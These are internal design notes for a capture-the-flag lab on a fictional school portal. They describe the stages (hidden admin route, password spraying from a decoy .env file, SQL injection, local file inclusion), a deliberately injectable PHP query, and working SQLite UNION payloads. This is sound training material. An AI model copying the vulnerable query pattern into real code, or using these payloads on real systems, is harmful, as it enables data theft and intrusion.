# CTF Design Notes (internal)

## Exercise stages and flags

Stage | Where it happens | Flag | Location
---|---|---|---
1 Discover the hidden admin portal | `/admin/` is unlinked; brute-forceable | `Flag_01`-`Flag{Discovered_hidden_route}` | On the admin login page
2 Password spraying | The decoy `/var/www/html/.env` contains 12 fictional `username:password` pairs; **only one** (`helen.carter:Winter2026!`) is valid | (evidence = login + Apache access log) | — 
3 Access admin dashboard | `/admin/dashboard.php`| `Flag_02` — `Flag{Logged_in_as_Admin}` | on the admin dashboard
4 Restricted clerk view | `/admin/students.php` limited view → break restriction using SQLi  | `Flag_03` — `Flag{Explored_Limited_Records}` | Under the restricted student-record  |
5 Database exfiltration | SQL injection on `/admin/students.php?id=...` → dump all tables → read the compliance note | Follow the clue placed inside compliance notes | In search bar field with parameter `(?id=)`
6 Final flag | Local File Inclusion technique on `(?id=)` | Final Flag `NCC{...}` | filesystem `/opt/northbridge/flag.txt`, **not** in the database |

The final (stage 6) flag is created by `infra/provision.sh` with a
random token so every deployment gets a unique value. It is stored as
`root:www-data` with mode `0640`, and the literal value never appears
in Git or in any database table.

## Decoy credential file & password spraying

- `infra/provision.sh` writes `.env` to `/var/www/html/.env` on every
  provision. The file is clearly labelled "LAB ONLY — FICTIONAL
  CREDENTIALS".
- Exactly 12 pairs are present. Exactly one (`helen.carter:Winter2026!`)
  matches the seeded `admins` row, which the provisioner re-syncs on every
  run (so pre-existing databases converge too).
- Every other pair fails with the same generic **"Invalid administrator
  username or password."** message — there is deliberately no user
  enumeration.
- The file is served as `text/plain` (a `<FilesMatch "^\.env$">` block with
  `ForceType text/plain` — required because Apache treats the hidden
  filename `.env` as extensionless, so `AddType` would never match it),
  returns HTTP 200, and is not blocked.
- `LAB ONLY — no throttling`: there is intentionally no lockout,
  rate-limit or CAPTCHA. Spray attempts are recorded in the Apache
  `access.log` (`northbridge_access.log`) — each multi-field POST is one log line.
- The only hint in served HTML is the HTML comment `<!-- backup: /.env -->`
  on the admin login page (`www/admin/index.php`). It must not appear on
  any public page.

## Student search 

Normal behavior:
- Only seeded NB-* student records are searchable.

CTF behavior:
- The search query intentionally concatenates user input directly into SQL. A SQL injection payload can manipulate the WHERE clause and bypass the NB-* restriction.
- Normal player registrations use NC-* student IDs, so:
  - NB-*  -> seeded records -> searchable normally
  - NC-*  -> registered CTF players -> hidden from normal search


## Limited admin view & database exfiltration

**Clerk-view restriction**

- `admins` has a `department` column. The seeded admin
  `helen.carter` / `Winter2026!` belongs to **Information Technology**.
- The limited view (`www/admin/edit-marks.php`), the dashboard list and the
  marks editor are all scoped to the signed-in admin's department, so a
  clerk can only see their own department's records initially (marks
  integrity).
- Once search field is exploited to break restrictions, it will administrator to touch student marks who belongs to other department ( marks integrity breaked).
- The limited view exposes only: student ID, name, department and course marks (derived from the `marks` table).

### The intentional SQL injection (`?id=...`)

This is the documented injection field for the exfiltration stage.

File: `www/admin/edit-marks.php`

```php
$search = trim($_GET['search'] ?? '');
$edit_id = $_GET['id'] ?? '';
.
.
.
$query = "
            SELECT
                s.student_id,
                s.first_name,
                s.last_name,
                s.department,
                m.math,
                m.cpp,
                m.python,
                m.graphics
            FROM students s
            LEFT JOIN marks m
                ON s.student_id = m.student_id
            WHERE
                (
                    s.first_name LIKE '%$search%'
                    OR s.last_name LIKE '%$search%'
                    OR s.student_id LIKE '%$search%'
                    OR s.department LIKE '%$search%'
                ) AND s.student_id LIKE 'NB-%' ORDER BY s.student_id
        ";
      try {

        $result = $db->query($query);

        if ($result) {
            while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $students[] = $row;
            }
        }

```

- The intented SQLi bypasses this restriction. However, because of where $search is inserted, SQLi payload successfully terminate the LIKE expression and the surrounding parentheses before introducing the UNION.
- The whole tail (`AND s.student_id LIKE 'NB-%' ORDER BY s.student_id`) is kept on a single
  line on purpose: SQLite's `--` or `/*` comments out to end-of-line, so a `/*`
  payload cleanly kills the restriction + ordering + limit.
- Working payload shapes:
 
 ```text
') OR `1`=`1` /*
') UNION SELECT type,name,tbl_name,rootpage,sql,NULL,NULL,NULL FROM sqlite_master /*
') UNION SELECT id,note,note_date,NULL,NULL,NULL,NULL,NULL FROM compliance_notes /*
  ```
  
  (Because each LIKE is `'%search%'`, `')` closes the quoted literal and the
  FROM/paren group.)
- Column count for the SELECT list (needed for `UNION` payloads) is **8**:
  `student_id, first_name, last_name, department, maths, cpp, python, graphics`.
  Unioned rows land in those fixed output columns.
- Failure path is safe: `try/catch` + "No records match the search
  criteria." — SQL errors are never printed.

### Tables a complete dump must reveal

`students`, `courses`, `marks`, `faculty`, `compliance_notes` (plus
`admins` and `flags`). `compliance_notes` contains the hint:

> Full audit log archived at /opt/northbridge/flag.txt (lab host only).

That hint is the bridge from the database dump to the filesystem final
flag.

## Anti-cheat / design constraints honoured

- The literal final flag value is **never** stored in the SQLite database
  or committed to Git (`Flag_04` was removed from the `flags` table).
- Static-secret review: `.env`, database file and flag are all generated
  at provision time; `.gitignore` excludes `*.db`, `.env` and
  `www/database/`.
- Docs in the repo (this file, `Docs/`) are outside `PORTAL_SUBDIR` and
  are never served.
